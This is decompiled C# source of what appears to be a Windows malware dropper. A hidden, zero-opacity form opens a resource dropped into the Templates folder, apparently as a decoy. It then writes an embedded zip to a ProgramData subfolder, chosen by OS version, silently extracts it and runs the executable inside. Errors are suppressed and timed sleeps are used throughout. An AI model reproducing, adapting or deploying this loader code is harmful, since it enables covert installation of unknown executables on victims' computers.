using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using davidharim.My.Resources;

namespace davidharim;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public void UnrdZirp()
	{
		try
		{
			string text = "\\Drathvwra\\";
			string text2 = "ravidhtirad";
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("Shell.Application")));
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + text;
			string text4 = Environment.OSVersion.ToString();
			byte[] bytes = ((!(text4.Contains("6.1") | text4.Contains("6.01"))) ? Resources.ravidhtirad10 : Resources.ravidhtirad07);
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			string text5 = text3 + text2;
			if (!File.Exists(text5))
			{
				File.WriteAllBytes(text5 + ".zip", bytes);
			}
			if (!File.Exists(text5 + ".exe".ToString()))
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { text3 }, (string[])null, (Type[])null, (bool[])null));
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "NameSpace", new object[1] { text5 + ".zip" }, (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateCall(objectValue2, (Type)null, "CopyHere", new object[2]
				{
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null)),
					4
				}, (string[])null, (Type[])null, (bool[])null, true);
			}
			Thread.Sleep(410);
			Process.Start(text5 + ".exe".ToString());
			string path = "";
			string text6 = "";
			if (File.Exists(path))
			{
				StreamReader streamReader = new StreamReader(path);
				while (streamReader.Peek() != -1)
				{
					text6 = streamReader.ReadLine();
					Strings.Split(text6, ",", -1, (CompareMethod)0);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void dbsrualbmloadrMde()
	{
		try
		{
			string text = Path.GetFileName(Application.get_ExecutablePath())!.Split(new char[1] { '.' })[0];
			davidharim davidharim2 = new davidharim();
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
			string text3 = text2 + text + davidharim2.file_Ext.ToString();
			File.WriteAllBytes(text3, Resources.davidharim);
			Process.Start(text3);
			string path = "";
			string text4 = "";
			if (File.Exists(path))
			{
				StreamReader streamReader = new StreamReader(path);
				while (streamReader.Peek() != -1)
				{
					text4 = streamReader.ReadLine();
					Strings.Split(text4, ",", -1, (CompareMethod)0);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread.Sleep(1110);
		dbsrualbmloadrMde();
		Thread.Sleep(5100);
		UnrdZirp();
		Thread.Sleep(8120);
		try
		{
			((Form)this).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Thread.Sleep(1100);
	}
}
